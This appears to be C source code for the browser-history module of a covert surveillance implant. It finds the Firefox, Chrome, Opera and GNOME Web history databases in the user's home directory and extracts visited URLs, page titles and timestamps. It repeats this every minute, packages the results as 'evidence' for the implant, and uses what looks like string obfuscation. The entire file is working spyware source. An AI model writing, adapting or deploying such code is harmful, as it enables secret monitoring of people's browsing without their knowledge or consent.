#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <glob.h>
#include <sqlite3.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/select.h>
#include <openssl/bio.h>

#include "module.h"
#include "evidencemanager.h"
#include "me.h"
#include "so.h"
#include "bioutils.h"
#include "fileutils.h"

#define EVIDENCE_VERSION 0x20100713

#define BROWSER_FIREFOX 0x02
#define BROWSER_CHROME  0x05
#define BROWSER_OPERA   0x03
#define BROWSER_WEB     0x08

static void url_firefox(void); /* Mozilla Firefox (Iceweasel, GNU IceCat) */
static void url_chrome(void);  /* Google Chrome (Chromium) */
static void url_opera(void);   /* Opera */
static void url_web(void);     /* GNOME Web */

struct entry {
   int browser;
   char *url;
   char *title;
   time_t time;
   struct entry *next;
};

static struct entry *list = NULL, *listp = NULL;
static time_t begin, end;

/* TODO valutare inotify per i file */
/* TODO gestire le liste */

void *module_url_main(void *args)
{
   BIO *bio_data = NULL;
   char *dataptr;
   long datalen;
   fd_set rfds;
   struct timeval tv;

   debugme("Module URL started\n");

   do {
      if(!(bio_data = BIO_new(BIO_s_mem()))) break;

      while(MODULE_URL.status != MODULE_STOPPING) {
         do {
            if(timemark(MODULE_URL_INDEX, &begin, &end)) break;

            url_firefox();
            url_chrome();
            url_opera();
            url_web();

            for(listp = list; listp; listp = listp->next) {
               debugme("URL %u %d %s %s\n", listp->time, listp->browser, listp->url, listp->title);
               if(BIO_putfiletime(bio_data, listp->time) == -1) break;
               if(BIO_puti32(bio_data, EVIDENCE_VERSION) == -1) break;
               if(BIO_puts16n(bio_data, listp->url) == -1) break;
               if(BIO_puti32(bio_data, listp->browser) == -1) break;
               if(BIO_puts16n(bio_data, listp->title) == -1) break;
               if(BIO_putsep(bio_data) == -1) break;
            }
            if(listp) break;

            if(!(datalen = BIO_get_mem_data(bio_data, &dataptr))) break;
            evidence_write(EVIDENCE_TYPE_URL, NULL, 0, dataptr, (int)datalen);
         } while(0);
         BIO_reset(bio_data);

         for(listp = list; listp;) {
            list = listp;
            listp = listp->next;
            if(list->url) free(list->url);
            if(list->title) free(list->title);
            free(list);
         }
         list = NULL;

         FD_ZERO(&rfds);
         FD_SET(MODULE_URL.event, &rfds);
         tv.tv_sec = 60;
         tv.tv_usec = 0;
         select(MODULE_URL.event + 1, &rfds, NULL, NULL, &tv);
      }
   } while(0);
   if(bio_data) BIO_free(bio_data);

   debugme("Module URL stopped\n");

   return NULL;
}

static void url_firefox(void)
{
   int i;
   glob_t g = {0};
   struct stat s;
   char *query = SO"SELECT IFNULL(B.url, ''), IFNULL(B.title, ''), A.visit_date/1000000 AS timestamp FROM moz_historyvisits AS A JOIN moz_places AS B ON A.place_id = B.id WHERE timestamp BETWEEN ? AND ?";
   sqlite3 *db = NULL;
   sqlite3_stmt *stmt = NULL;

   do {
      if(initlib(INIT_LIBSQLITE3)) break;
      if(glob(SO"~/.mozilla/{firefox,icecat}/*/places.sqlite", GLOB_NOSORT|GLOB_TILDE|GLOB_BRACE, NULL, &g)) break;

      for(i = 0; i < g.gl_pathc; i++) {
         do {
            if(stat(g.gl_pathv[i], &s) || (s.st_mtime < begin)) break;
            if(sqlite3_open(g.gl_pathv[i], &db) != SQLITE_OK) break;
            if(sqlite3_prepare_v2(db, query, strlen(query) + 1, &stmt, NULL) != SQLITE_OK) break;
            if(sqlite3_bind_int(stmt, 1, (int)begin) != SQLITE_OK) break;
            if(sqlite3_bind_int(stmt, 2, (int)end) != SQLITE_OK) break;
            while(sqlite3_step(stmt) == SQLITE_ROW) {
               /* TODO gestire con una lista */
               if(!list) {
                  if(!(list = malloc(sizeof(struct entry)))) break;
                  listp = list;
               } else {
                  if(!(listp->next = malloc(sizeof(struct entry)))) break;
                  listp = listp->next;
               }

               listp->next = NULL;
               listp->browser = BROWSER_FIREFOX;
               listp->url = strdup(sqlite3_column_text(stmt, 0));
               listp->title = strdup(sqlite3_column_text(stmt, 1));
               listp->time = (time_t)sqlite3_column_int(stmt, 2);
               /* TODO */
            }
         } while(0);
         if(stmt) { sqlite3_finalize(stmt); stmt = NULL; }
         if(db) { sqlite3_close(db); db = NULL; }
      }
   } while(0);
   globfree(&g);

   return;
}

static void url_chrome(void)
{
   int i;
   glob_t g = {0};
   struct stat s;
   char *query = SO"SELECT IFNULL(B.url, ''), IFNULL(B.title, ''), A.visit_time/1000000-11644473600 AS timestamp FROM visits AS A JOIN urls AS B ON A.url = B.id WHERE timestamp BETWEEN ? AND ?";
   char *tmpf = NULL;
   sqlite3 *db = NULL;
   sqlite3_stmt *stmt = NULL;

   do {
      if(initlib(INIT_LIBSQLITE3)) break;
      if(glob(SO"~/.config/{google-chrome,chromium}/*/History", GLOB_NOSORT|GLOB_TILDE|GLOB_BRACE, NULL, &g)) break;

      for(i = 0; i < g.gl_pathc; i++) {
         do {
            if(stat(g.gl_pathv[i], &s) || (s.st_mtime < begin)) break;
            if(!(tmpf = clonefile(g.gl_pathv[i]))) break;
            if(sqlite3_open(tmpf, &db) != SQLITE_OK) break;
            if(sqlite3_prepare_v2(db, query, strlen(query) + 1, &stmt, NULL) != SQLITE_OK) break;
            if(sqlite3_bind_int(stmt, 1, (int)begin) != SQLITE_OK) break;
            if(sqlite3_bind_int(stmt, 2, (int)end) != SQLITE_OK) break;
            while(sqlite3_step(stmt) == SQLITE_ROW) {
               /* TODO gestire con una lista */
               if(!list) {
                  if(!(list = malloc(sizeof(struct entry)))) break;
                  listp = list;
               } else {
                  if(!(listp->next = malloc(sizeof(struct entry)))) break;
                  listp = listp->next;
               }

               listp->next = NULL;
               listp->browser = BROWSER_CHROME;
               listp->url = strdup(sqlite3_column_text(stmt, 0));
               listp->title = strdup(sqlite3_column_text(stmt, 1));
               listp->time = (time_t)sqlite3_column_int(stmt, 2);
               /* TODO */
            }
         } while(0);
         if(stmt) { sqlite3_finalize(stmt); stmt = NULL; }
         if(db) { sqlite3_close(db); db = NULL; }
         if(tmpf) { unlink(tmpf); free(tmpf); tmpf = NULL; }
      }
   } while(0);
   globfree(&g);

   return;
}

static void url_opera(void)
{
   int i;
   glob_t g = {0};
   struct stat s;
   char *url = NULL, *title = NULL;
   time_t timestamp;
   int match, tag;
   FILE *fp = NULL;

   do {
      if(glob(SO"~/.opera/global_history.dat", GLOB_NOSORT|GLOB_TILDE|GLOB_BRACE, NULL, &g)) break;

      for(i = 0; i < g.gl_pathc; i++) {
         do {
            if(stat(g.gl_pathv[i], &s) || (s.st_mtime < begin)) break;
            if(!(fp = fopen(g.gl_pathv[i], "r"))) break;
            while(!feof(fp)) {
               do {
                  if((match = fscanf(fp, "%m[^\n]\n%m[^\n]\n%ld\n%d\n", &title, &url, &timestamp, &tag)) != 4) break;
                  if((timestamp < begin) || (timestamp > end)) break;
                   /* TODO gestire con una lista */
                  if(!list) {
                     if(!(list = malloc(sizeof(struct entry)))) break;
                     listp = list;
                  } else {
                     if(!(listp->next = malloc(sizeof(struct entry)))) break;
                     listp = listp->next;
                  }

                  listp->next = NULL;
                  listp->browser = BROWSER_OPERA;
                  listp->url = strdup(url);
                  listp->title = strdup(title);
                  listp->time = timestamp;
                  /* TODO */
               } while(0);
               if(title) { free(title); title = NULL; }
               if(url) { free(url); url = NULL; }
               if(match != 4) break;
            }
         } while(0);
         if(fp) fclose(fp);
      }
   } while(0);
   globfree(&g);

   return;
}

static void url_web(void)
{
   int i;
   glob_t g = {0};
   struct stat s;
   char *query = SO"SELECT IFNULL(B.url, ''), IFNULL(B.title, ''), A.visit_time AS timestamp FROM visits AS A JOIN urls AS B ON A.url = B.id WHERE timestamp BETWEEN ? AND ?";
   sqlite3 *db = NULL;
   sqlite3_stmt *stmt = NULL;

   do {
      if(initlib(INIT_LIBSQLITE3)) break;
      if(glob(SO"~/.gnome2/epiphany/ephy-history.db", GLOB_NOSORT|GLOB_TILDE|GLOB_BRACE, NULL, &g)) break;

      for(i = 0; i < g.gl_pathc; i++) {
         do {
            if(stat(g.gl_pathv[i], &s) || (s.st_mtime < begin)) break;
            if(sqlite3_open(g.gl_pathv[i], &db) != SQLITE_OK) break;
            if(sqlite3_prepare_v2(db, query, strlen(query) + 1, &stmt, NULL) != SQLITE_OK) break;
            if(sqlite3_bind_int(stmt, 1, (int)begin) != SQLITE_OK) break;
            if(sqlite3_bind_int(stmt, 2, (int)end) != SQLITE_OK) break;
            while(sqlite3_step(stmt) == SQLITE_ROW) {
               /* TODO gestire con una lista */
               if(!list) {
                  if(!(list = malloc(sizeof(struct entry)))) break;
                  listp = list;
               } else {
                  if(!(listp->next = malloc(sizeof(struct entry)))) break;
                  listp = listp->next;
               }

               listp->next = NULL;
               listp->browser = BROWSER_WEB;
               listp->url = strdup(sqlite3_column_text(stmt, 0));
               listp->title = strdup(sqlite3_column_text(stmt, 1));
               listp->time = (time_t)sqlite3_column_int(stmt, 2);
               /* TODO */
            }
         } while(0);
         if(stmt) { sqlite3_finalize(stmt); stmt = NULL; }
         if(db) { sqlite3_close(db); db = NULL; }
      }
   } while(0);
   globfree(&g);

   return;
}
